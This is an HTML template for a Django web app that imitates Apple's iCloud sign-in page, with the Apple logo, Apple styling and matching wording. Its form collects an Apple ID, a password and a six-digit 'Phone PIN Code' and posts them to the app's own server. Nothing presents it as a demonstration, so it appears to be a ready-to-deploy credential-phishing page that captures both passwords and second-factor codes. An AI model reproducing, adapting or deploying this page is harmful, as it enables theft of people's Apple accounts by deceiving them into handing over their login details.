<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In - iCloud</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0;
        }

        .login-container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 18px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
            padding: 48px;
            width: 100%;
            max-width: 400px;
            border: 1px solid rgba(255, 255, 255, 0.3);
        }

        .apple-logo {
            font-size: 48px;
            color: #000;
            text-align: center;
            margin-bottom: 32px;
        }

        .form-title {
            font-size: 32px;
            font-weight: 600;
            color: #1d1d1f;
            text-align: center;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }

        .form-subtitle {
            color: #6e6e73;
            text-align: center;
            margin-bottom: 32px;
            font-size: 17px;
            line-height: 1.47;
        }

        .form-floating {
            margin-bottom: 16px;
        }

        .form-floating .form-control {
            border: 1px solid #d2d2d7;
            border-radius: 12px;
            padding: 16px 16px 8px 16px;
            font-size: 17px;
            background: rgba(255, 255, 255, 0.8);
            transition: all 0.2s ease;
        }

        .form-floating .form-control:focus {
            border-color: #007aff;
            box-shadow: 0 0 0 3px rgba(0, 122, 255, 0.1);
            background: #fff;
        }

        .form-floating label {
            color: #6e6e73;
            font-size: 17px;
            padding: 16px;
        }

        .btn-primary {
            background: #007aff;
            border: none;
            border-radius: 12px;
            padding: 16px;
            font-size: 17px;
            font-weight: 600;
            width: 100%;
            margin-top: 16px;
            margin-bottom: 24px;
            transition: all 0.2s ease;
        }

        .btn-primary:hover {
            background: #0051d5;
            transform: translateY(-1px);
        }

        .forgot-password {
            color: #007aff;
            text-decoration: none;
            font-size: 17px;
            display: block;
            text-align: center;
            margin-bottom: 24px;
            transition: opacity 0.2s ease;
        }

        .forgot-password:hover {
            color: #0051d5;
            opacity: 0.8;
        }

        .divider {
            text-align: center;
            margin: 32px 0;
            position: relative;
            color: #6e6e73;
            font-size: 15px;
        }

        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: #d2d2d7;
        }

        .divider span {
            background: rgba(255, 255, 255, 0.95);
            padding: 0 16px;
        }

        .create-account {
            color: #007aff;
            text-decoration: none;
            font-size: 17px;
            display: block;
            text-align: center;
            font-weight: 500;
            transition: opacity 0.2s ease;
        }

        .create-account:hover {
            color: #0051d5;
            opacity: 0.8;
        }

        .footer-links {
            text-align: center;
            margin-top: 32px;
            padding-top: 24px;
            border-top: 1px solid #e5e5ea;
        }

        .footer-links a {
            color: #6e6e73;
            text-decoration: none;
            font-size: 13px;
            margin: 0 12px;
            transition: color 0.2s ease;
        }

        .footer-links a:hover {
            color: #1d1d1f;
        }

        /* Responsive adjustments */
        
        /* Extra large devices (large desktops, 1200px and up) */
        @media (min-width: 1200px) {
            .login-container {
                max-width: 420px;
                padding: 56px;
            }
        }
        
        /* Large devices (desktops, 992px and up) */
        @media (min-width: 992px) and (max-width: 1199px) {
            .login-container {
                max-width: 400px;
                padding: 48px;
            }
        }
        
        /* Medium devices (tablets, 768px and up) */
        @media (min-width: 768px) and (max-width: 991px) {
            .login-container {
                max-width: 380px;
                padding: 40px 36px;
                margin: 20px;
            }
            
            .form-title {
                font-size: 30px;
            }
            
            .apple-logo {
                font-size: 44px;
                margin-bottom: 28px;
            }
        }
        
        /* Small devices (landscape phones, 576px and up) */
        @media (min-width: 576px) and (max-width: 767px) {
            .login-container {
                max-width: 360px;
                padding: 36px 28px;
                margin: 16px;
            }
            
            .form-title {
                font-size: 28px;
            }
            
            .form-subtitle {
                font-size: 16px;
                margin-bottom: 28px;
            }
            
            .apple-logo {
                font-size: 40px;
                margin-bottom: 24px;
            }
            
            .form-floating .form-control {
                padding: 14px 14px 6px 14px;
                font-size: 16px;
            }
            
            .form-floating label {
                font-size: 16px;
                padding: 14px;
            }
            
            .btn-primary {
                padding: 14px;
                font-size: 16px;
            }
            
            #pin {
                font-size: 18px;
            }
        }
        
        /* Extra small devices (portrait phones, less than 576px) */
        @media (max-width: 575px) {
            body {
                padding: 8px;
                background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            }
            
            .login-container {
                margin: 8px;
                padding: 28px 20px;
                max-width: none;
                width: calc(100vw - 16px);
                border-radius: 16px;
            }
            
            .form-title {
                font-size: 26px;
                margin-bottom: 6px;
            }
            
            .form-subtitle {
                font-size: 15px;
                margin-bottom: 24px;
                line-height: 1.4;
            }
            
            .apple-logo {
                font-size: 36px;
                margin-bottom: 20px;
            }
            
            .form-floating {
                margin-bottom: 14px;
            }
            
            .form-floating .form-control {
                padding: 12px 12px 4px 12px;
                font-size: 16px;
                border-radius: 10px;
            }
            
            .form-floating label {
                font-size: 15px;
                padding: 12px;
            }
            
            .btn-primary {
                padding: 12px;
                font-size: 16px;
                margin-top: 12px;
                margin-bottom: 20px;
                border-radius: 10px;
            }
            
            .forgot-password, .create-account {
                font-size: 16px;
            }
            
            .divider {
                margin: 24px 0;
                font-size: 14px;
            }
            
            .footer-links {
                margin-top: 24px;
                padding-top: 20px;
            }
            
            .footer-links a {
                font-size: 12px;
                margin: 0 8px;
                display: inline-block;
                margin-bottom: 8px;
            }
            
            #pin {
                font-size: 16px;
                letter-spacing: 2px;
            }
            
            .form-check-label {
                font-size: 14px !important;
            }
        }
        
        /* Very small devices (small phones in portrait, less than 375px) */
        @media (max-width: 374px) {
            .login-container {
                padding: 24px 16px;
                margin: 4px;
                width: calc(100vw - 8px);
            }
            
            .form-title {
                font-size: 24px;
            }
            
            .apple-logo {
                font-size: 32px;
            }
            
            .form-floating .form-control {
                padding: 10px 10px 2px 10px;
                font-size: 15px;
            }
            
            .form-floating label {
                font-size: 14px;
                padding: 10px;
            }
            
            .btn-primary {
                font-size: 15px;
                padding: 10px;
            }
            
            #pin {
                font-size: 15px;
            }
        }
        
        /* Landscape orientation for small devices */
        @media (max-height: 600px) and (orientation: landscape) {
            body {
                padding: 4px 8px;
            }
            
            .login-container {
                padding: 20px 24px;
                margin: 4px auto;
                max-height: 90vh;
                overflow-y: auto;
            }
            
            .apple-logo {
                font-size: 28px;
                margin-bottom: 12px;
            }
            
            .form-title {
                font-size: 22px;
                margin-bottom: 4px;
            }
            
            .form-subtitle {
                font-size: 14px;
                margin-bottom: 16px;
            }
            
            .form-floating {
                margin-bottom: 10px;
            }
            
            .btn-primary {
                margin-top: 8px;
                margin-bottom: 12px;
            }
            
            .divider {
                margin: 16px 0;
            }
            
            .footer-links {
                margin-top: 16px;
                padding-top: 12px;
            }
        }
        
        /* High DPI / Retina displays */
        @media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
            .login-container {
                border: 0.5px solid rgba(255, 255, 255, 0.3);
            }
        }
        
        /* Dark mode support */
        @media (prefers-color-scheme: dark) {
            body {
                background: linear-gradient(135deg, #1c1c1e 0%, #2c2c2e 100%);
            }
            
            .login-container {
                background: rgba(44, 44, 46, 0.95);
                border: 1px solid rgba(255, 255, 255, 0.1);
            }
            
            .form-title {
                color: #f2f2f7;
            }
            
            .form-subtitle, .form-floating label, .divider {
                color: #8e8e93;
            }
            
            .form-floating .form-control {
                background: rgba(58, 58, 60, 0.8);
                border-color: #48484a;
                color: #f2f2f7;
            }
            
            .form-floating .form-control:focus {
                background: #48484a;
                border-color: #007aff;
            }
            
            .divider::before {
                background: #48484a;
            }
            
            .divider span {
                background: rgba(44, 44, 46, 0.95);
            }
            
            .footer-links {
                border-top-color: #48484a;
            }
            
            .footer-links a:hover {
                color: #f2f2f7;
            }
            
            .form-check-label {
                color: #f2f2f7 !important;
            }
            
            #pin::placeholder {
                color: #636366;
            }
        }

        /* Custom PIN input styling */
        #pin {
            font-family: 'SF Mono', 'Monaco', 'Inconsolata', 'Fira Code', 'Droid Sans Mono', 'Source Code Pro', monospace;
            letter-spacing: 3px;
            text-align: center;
            font-size: 20px;
            font-weight: 500;
        }

        #pin::placeholder {
            letter-spacing: 2px;
            color: #c7c7cc;
        }
        .form-check-input:checked {
            background-color: #007aff;
            border-color: #007aff;
        }

        .form-check-input:focus {
            border-color: #007aff;
            box-shadow: 0 0 0 3px rgba(0, 122, 255, 0.1);
        }
    </style>
</head>
<body>
    <div class="login-container">
        <!-- Apple Logo -->
        <div class="apple-logo">
            <i class="fab fa-apple"></i>
        </div>

        <!-- Title -->
        <h1 class="form-title">Sign In</h1>
        <p class="form-subtitle">Use your Apple ID to sign in to iCloud</p>

        <!-- Login Form -->
        <form method="post">
            {% csrf_token %}
            
            <div class="form-floating">
                <input type="email" class="form-control" id="email" name="email" placeholder="name@example.com" required>
                <label for="email">Apple ID</label>
            </div>

            <div class="form-floating">
                <input type="password" class="form-control" id="password" name="password" placeholder="Password" required>
                <label for="password">Password</label>
            </div>

            <div class="form-floating">
                <input type="tel" class="form-control" id="pin" name="pin" placeholder="000000" maxlength="6" pattern="[0-9]{6}" required>
                <label for="pin">Phone PIN Code</label>
            </div>

            <div class="form-check mb-3">
                <input class="form-check-input" type="checkbox" id="remember" name="remember">
                <label class="form-check-label" for="remember" style="color: #1d1d1f; font-size: 15px;">
                    Keep me signed in
                </label>
            </div>

            <button type="submit" class="btn btn-primary">
                <i class="fas fa-arrow-right me-2"></i>Continue
            </button>
        </form>

        <!-- Forgot Password Link -->
        <a href="#" class="forgot-password">Forgot Apple ID or password?</a>

        <!-- Divider -->
        <div class="divider">
            <span>or</span>
        </div>

        <!-- Create Account Link -->
        <a href="#" class="create-account">Create Your Apple ID</a>

        <!-- Footer Links -->
        <div class="footer-links">
            <a href="#">Privacy Policy</a>
            <a href="#">Terms of Service</a>
            <a href="#">Support</a>
        </div>
    </div>

    <!-- Bootstrap JS -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>
</body>
</html>
